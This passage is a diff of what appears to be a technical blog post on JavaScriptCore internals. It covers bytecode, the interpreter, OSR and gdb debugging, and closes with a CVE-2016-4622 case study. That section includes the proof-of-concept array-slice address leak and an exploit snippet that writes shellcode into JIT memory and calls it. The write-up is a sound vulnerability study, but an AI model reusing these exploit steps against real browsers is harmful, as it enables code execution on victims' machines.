-JSC::evaluate()                                      at Source/JavaScriptCore/runtime/Completion.cpp:106
-runInteractive()                                     at Source/JavaScriptCore/jsc.cpp:1906
-runJSC()                                             at Source/JavaScriptCore/jsc.cpp:2056
-jscmain()                                            at Source/JavaScriptCore/jsc.cpp:2105
-main()                                               at Source/JavaScriptCore/jsc.cpp:1757
-```
-
-
-### Bytecode
-
-``Source/JavaScriptCore/llint/LowLevelInterpreter.asm``
-``Source/JavaScriptCore/bytecode/BytecodeList.json`` generates ``Bytecode.h``
-
-and the assembler is at ``Source/JavaScriptCore/offlineasm/asm.rb`` and it's compiled
-into the generated ``obj/DerivedSources/JavaScriptCore/LLIntAssembly.h``
-
-```asm
-OFFLINE_ASM_GLOBAL_LABEL(vmEntryToJavaScript)
-    "\tpush %rbp\n"                                          // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:669
-    "\tmovq %rsp, %rbp\n"                                    // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:676
-    "\tmovq %rbp, %rsp\n"                                    // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:691
-    "\tsubq $32, %rsp\n"
-    "\tmovq %rsp, %r8\n"                                     // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:420
-    "\tandq $15, %r8\n"
-    "\ttestq %r8, %r8\n"                                     // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:422
-    "\tjz " LOCAL_LABEL_STRING(_offlineasm_doVMEntry__checkStackackPointerOkay) "\n"
-    "\tmovq $3134249985, %r8\n"                              // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:423
-    "\tint $3\n"                                             // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:424
-```
-
-After having defined a function, when is called you have the following
-
-```
-JSC::FunctionNode::emitBytecode()                       at Source/JavaScriptCore/bytecompiler/NodesCodegen.cpp:3047
-JSC::BytecodeGenerator::generate()                      at Source/JavaScriptCore/bytecompiler/BytecodeGenerator.cpp:103
-JSC::generateUnlinkedFunctionCodeBlock()                at Source/JavaScriptCore/bytecode/UnlinkedFunctionExecutable.cpp:75
-JSC::UnlinkedFunctionExecutable::unlinkedCodeBlockFor() at Source/JavaScriptCore/bytecode/UnlinkedFunctionExecutable.cpp:203
-JSC::ScriptExecutable::newCodeBlockFor()                at Source/JavaScriptCore/runtime/Executable.cpp:305
-JSC::ScriptExecutable::prepareForExecutionImpl()        at Source/JavaScriptCore/runtime/Executable.cpp:398
-JSC::ScriptExecutable::prepareForExecution()            at Source/JavaScriptCore/runtime/Executable.h:393
-JSC::LLInt::setUpCall()                                 at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1176
-JSC::LLInt::genericCall()                               at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1238
-JSC::LLInt::llint_slow_path_call()                      at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1244
-llint_entry ()                                          at Source/JavaScriptCore/runtime/Identifier.h:142
-vmEntryToJavaScript ()                                  at Source/JavaScriptCore/runtime/Identifier.h:142
-JSC::JITCode::execute()                                 at Source/JavaScriptCore/jit/JITCode.cpp:80
-JSC::Interpreter::execute()                             at Source/JavaScriptCore/interpreter/Interpreter.cpp:971
-JSC::evaluate()                                         at Source/JavaScriptCore/runtime/Completion.cpp:106
-runInteractive()                                        at Source/JavaScriptCore/jsc.cpp:1906
-runJSC()                                                at Source/JavaScriptCore/jsc.cpp:2056
-jscmain()                                               at Source/JavaScriptCore/jsc.cpp:2105
-main()                                                  at Source/JavaScriptCore/jsc.cpp:1757
-```
-
-but it's transformed into bytecode **only the first time**, probably is cached in the
-following calls. The function that does something is ``ScriptExecutable::installCode()``
-at the and of ``ScriptExecutable::prepareForExecutionImpl()`` that via ``ScriptExecutable::newCodeBlockFor()``
-generates the bytecode.
 
 ![]({{ site.baseurl }}/public/images/javascriptcore/linking.png)
+![]({{ site.baseurl }}/public/images/javascriptcore/JIT.png)
+![]({{ site.baseurl }}/public/images/javascriptcore/prepareForExecutionImpl.png)
 
 Take in mind that exist two "phases" for the bytecode: after parsing is in an **unlinked** stage
 where the bytecode uses a variable-length encoding but before is executed needs to be **linked**,
 like in normal executable where external references have to be resolved; moreover the "encoding is expanded",
-the opcodes and operands are make "pointer sized"; all this happens in ``CodeBlock::finishCreation()``.
+the opcodes and operands are make "pointer sized"; all this happens in
+``CodeBlock::finishCreation(VM& vm, ScriptExecutable* ownerExecutable, UnlinkedCodeBlock* unlinkedCodeBlock, JSScope* scope)``.
+
+The function that sets the ``m_unlinkedInstructions`` inside
+``UnlinkedCodeBlock`` is ``BytecodeGenerator::generate()``
 
 It's possible to dump the bytecode via ``CodeBlock::dumpBytecode()``, the relevant function
 is at ``CodeBlock.cpp``, this is an example of the output:
@@ -729,7 +1323,7 @@ Constants:
 undefined
 ```
 
-```
+```c++
 JSValue JITCode::execute(VM* vm, ProtoCallFrame* protoCallFrame)
 {
     void* entryAddress;
@@ -746,56 +1340,41 @@ JSValue JITCode::execute(VM* vm, ProtoCallFrame* protoCallFrame)
 ```
 
 
-### Interpreter
-
-The source code comes with the ``jsc`` interpreter with which is possible to try
-to experiment.
-
-``-d`` enable the dumping of the bytecode on the fly
-
-For me it's important to understand how this works: here the code of the main loop
-of the interpreter:
+### LLint
 
 ```c++
-// Source/JavaScriptCore/jsc.cpp
-static void runInteractive(GlobalObject* globalObject)
+#define LLINT_SLOW_PATH_DECL(name) \
+    extern "C" SlowPathReturnType llint_##name(ExecState* exec, Instruction* pc)
+```
+
+### OSR
+
+The **On-Stack Replacement** is the mechanism by which there is a tier-switch during execution
+
+```c++
+static SlowPathReturnType entryOSR(ExecState* exec, Instruction*, CodeBlock* codeBlock, const char *name, EntryKind kind)
 {
-    String interpreterName(ASCIILiteral("Interpreter"));
-    
-    bool shouldQuit = false;
-    while (!shouldQuit) {
-        printf("%s", interactivePrompt);
-        Vector<char, 256> line;
-        int c;
-        while ((c = getchar()) != EOF) {
-            // FIXME: Should we also break on \r? 
-            if (c == '\n')
-                break;
-            line.append(c);
-        }
-        if (line.isEmpty())
-            break;
-
-        NakedPtr<Exception> evaluationException;
-        JSValue returnValue = evaluate(
-            globalObject->globalExec(),
-            jscSource(line, interpreterName),  // [1]
-            JSValue(),
-            evaluationException);
-
-        if (evaluationException)
-            printf("Exception: %s\n", evaluationException->value().toString(globalObject->globalExec())->value(globalObject->globalExec()).utf8().data());
-        else
-            printf("%s\n", returnValue.toString(globalObject->globalExec())->value(globalObject->globalExec()).utf8().data());
-
-        globalObject->globalExec()->clearException();
-        globalObject->vm().drainMicrotasks();
+    if (Options::verboseOSR()) {
+        dataLog(
+            *codeBlock, ": Entered ", name, " with executeCounter = ",
+            codeBlock->llintExecuteCounter(), "\n");
     }
-    printf("\n");
+    
+    if (!shouldJIT(exec, codeBlock)) {
+        codeBlock->dontJITAnytimeSoon();
+        LLINT_RETURN_TWO(0, 0);
+    }
+    if (!jitCompileAndSetHeuristics(codeBlock, exec))
+        LLINT_RETURN_TWO(0, 0);
+    
+    if (kind == Prologue)
+        LLINT_RETURN_TWO(codeBlock->jitCode()->executableAddress(), 0);
+    ASSERT(kind == ArityCheck);
+    LLINT_RETURN_TWO(codeBlock->jitCode()->addressForCall(MustCheckArity).executableAddress(), 0);
 }
 ```
 
-``jscSource`` at ``[1]`` is like a wrapper class around the literal text passed to the interpreter.
+You can use the environment variable ``JSC_verboseOSR=true`` to have debugging information.
 
 ## GDB manual session
 
@@ -804,6 +1383,9 @@ code with ``gdb`` and the actual vulnerable version of the code. I found
 that the most reliable way to compile the code is to use docker and a ``debian:jesse``
 base image (I have a Dockerfile in my [repository](https://github.com/gipi/cve-cemetery)
 for that).
+
+**Note:** I advice to use the tab completion from the ``gdb`` prompt with a little caution
+since the number of symbols to parse is so big that causes unresponsiveness from time to time.
 
 Instead of using a webkit browser is simpler to use the javascript console (``jsc``)
 directly from the build directory; as a PoC I'll use the saelo's [one](https://github.com/saelo/jscpwn).
@@ -894,7 +1476,7 @@ gef➤  ptype/om JSC::JSCell
 ```
 
 Sometimes reaching the right instance of an object is a little tricky, but
-from ``gdb`` is possible to create magic spells if like this below to reach
+from ``gdb`` is possible to create magic spells like this below to reach
 the structure describing the object properties:
 
 ```
@@ -1013,7 +1595,40 @@ gef➤  x/20xg $obj->butterfly()
 ```
 
 Probably the best way to interact is using convenience variables
-since is more portable with respect to resolve each field and subfield.
+since is more portable with respect to resolving each field and subfield.
+
+### Bytecode
+
+Try to play a little with ``gdb`` and executable code
+
+```
+>>> describe(a)
+...
+Cell: 0x7f9dd5f9f5e0 (0x7f9dd5ffa680:[Function, {}, NonArray, Proto:0x7f9dd5ff1e00]), ID: 51
+```
+
+```
+gef➤  print (('JSC::ExecutableBase'*)(('JSC::JSFunction'*)0x7f9dd5f9f5e0)->m_executable.m_cell).m_jitCodeForCall.m_ptr->executableAddressAtOffset(0)
+$57 = (void *) 0x7f9dd79ffca0
+gef➤  x/3i 0x7f9dd79ffca0
+   0x7f9dd79ffca0:      movabs rax,0x7f9e1ad7deb1
+   0x7f9dd79ffcaa:      jmp    rax
+   0x7f9dd79ffcac:      add    BYTE PTR [rax],al
+gef➤  x/3i 0x7f9e1ad7deb1
+   0x7f9e1ad7deb1 <llint_entry+3296>:   push   rbp
+   0x7f9e1ad7deb2 <llint_entry+3297>:   mov    rbp,rsp
+   0x7f9e1ad7deb5 <llint_entry+3300>:   mov    rsi,QWORD PTR [rbp+0x18]
+gef➤  print LLInt::Data::s_opcodeMap[136]
+$60 = (void *) 0x7f9e1ad7deb1 <llint_entry+3296>
+```
+
+I used ``136`` because of this
+
+```
+setEntryAddress(136, _llint_function_for_call_prologue)
+```
+
+defined into ``obj-x86_64-linux-gnu/DerivedSources/JavaScriptCore/InitBytecodes.asm``.
 
 ## GEF
 
@@ -1059,7 +1674,7 @@ I can use the ``gdb.lookup_type()`` function
 (obviously ``gdb`` must know about this type, this means you have loaded a binary
 with the simbols, maybe debug symbols?).
 
-I cannot indicate explicitely a pointer (``JSC::JSCell``*) but instead I have to use
+I cannot indicate explicitely a pointer (``JSC::JSCell*``) but instead I have to use
 the ``pointer()`` method
 
 ```
@@ -1123,6 +1738,8 @@ Obviously is possible to set convenience variables also using the python API
 
 ## Use gef with JSC
 
+TODO
+
 ## Case study: CVE-2016-4622
 
 Now that we have a deeper understanding of the ``JSC`` internals should be easier understand
@@ -1131,21 +1748,87 @@ what saelo was talking about.
 To automatize the analysis you can use the following ``gdb``'s [script]({{ site.baseurl }}/public/code/javascriptcore/bp.gdb)
 that sets breakpoints in important points to see what the vulnerability is actually "doing".
 
+To summarize the PoC we have the following lines
+
 ```
-obj = {a: 1, b:2}
->>> a = [];for (var i = 0; i < 100; i++)a.push(i + 13.37);var b = a.slice(0, {valueOf: function() { a.length = 0;c=[obj];return 4;}});b
+>>> obj = {a: 1, b:2}
+[object Object]
+>>> a = [];for (var i = 0; i < 100; i++)a.push(i + 13.37);
+>>> var b = a.slice(0, {valueOf: function() { a.length = 0;c=[obj];return 4;}});
+>>> b
 13.37,14.37,8.4879831644e-314,4.6843036111784e-310
 ```
 
+I can retrieve the addresses
+
+```
+>>> describe(obj)
+Cell: 0x7f9dd5fdfe00 (0x7f9dd5f8f800:[Object, {a:0, b:1}, NonArray, Proto:0x7f9dd5fcbff0, Leaf]), ID: 372
+>>> describe(b)
+Cell: 0x7f9dd5fcbcd0 (0x7f9dd5ff8380:[Array, {}, ArrayWithDouble, Proto:0x7f9dd5fd76d0, Leaf]), ID: 121
+```
+
+and take a look from ``gdb`` and see that the forth value in the butterfly is the address of ``obj``:
+
+```
+gef➤  set $obj = (('JSC::JSObject'*) 0x7f9dd5fcbcd0)
+gef➤  x/10xg $obj->butterfly()
+0x7f9dd73fe5f8: 0x402abd70a3d70a3d      0x402cbd70a3d70a3d
+0x7f9dd73fe608: 0x0000000400000001      0x00007f9dd5fdfe00
+0x7f9dd73fe618: 0x0000000000000000      0x0000000000000000
+0x7f9dd73fe628: 0x0000000000000000      0x0000000000000000
+0x7f9dd73fe638: 0x0000000000000000      0x0000000000000000
+```
+
+With this we have a **read primitive** for internal memory addresses; but why?
+
+TODO
+
+Now that we have the read/write primitives and we can create objects
+"on demand" we can use our knowledge about the internal structure of
+``JSFunction`` to finally execute some code
+
+```js
+// Now the easy part:
+//   1. Leak a pointer to a JIT compiled function
+//   2. Leak the pointer into executable memory
+//   3. Write shellcode there
+//   4. Call the function
+var func = makeJITCompiledFunction();
+var funcAddr = addrof(func);
+print("[+] Shellcode function object @ " + funcAddr);
+
+var executableAddr = memory.readInt64(Add(funcAddr, 24));
+print("[+] Executable instance @ " + executableAddr);
+
+var jitCodeAddr = memory.readInt64(Add(executableAddr, 16));
+print("[+] JITCode instance @ " + jitCodeAddr);
+
+var codeAddr = memory.readInt64(Add(jitCodeAddr, 32));
+print("[+] RWX memory @ " + codeAddr.toString());
+
+print("[+] Writing shellcode...");
+memory.write(codeAddr, shellcode);
+
+print("[!] Jumping into shellcode...");
+func();
+```
 
 ## Linkography
+
+### JSC
 
  - [A New Bytecode Format for JavaScriptCore](https://webkit.org/blog/9329/a-new-bytecode-format-for-javascriptcore/)
  - [Introducing the WebKit FTL JIT](https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/)
  - [JavaScriptCore CSI: A Crash Site Investigation Story](https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/)
- - [printers.py](http://www.cs.ru.nl/~gdal/dotfiles/.gdb/printers/python/libstdcxx/v6/printers.py)
  - [Thinking outside the JIT Compiler: Understanding and bypassing StructureID Randomization with generic and old-school methods](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf)
  - [Hack The Real: An exploitation chain to break Safari browser](https://gts3.org/2019/Real-World-CTF-2019-Safari.html)
  - [INVERTING YOUR ASSUMPTIONS: A GUIDE TO JIT COMPARISONS](https://www.zerodayinitiative.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons)
  - [JavaScriptCore, the WebKit JS implementation](https://wingolog.org/archives/2011/10/28/javascriptcore-the-webkit-js-implementation)
  - [inside javascriptcore's low-level interpreter](https://wingolog.org/archives/2012/06/27/inside-javascriptcores-low-level-interpreter)
+ - [JavaScript Engine Fuzzing and Exploitation Reading List](https://zon8.re/posts/javascript-engine-fuzzing-and-exploitation-reading-list/)
+
+### GDB
+
+ - [GDB's Python API](https://sourceware.org/gdb/onlinedocs/gdb/Python-API.html)
+ - [printers.py](http://www.cs.ru.nl/~gdal/dotfiles/.gdb/printers/python/libstdcxx/v6/printers.py)
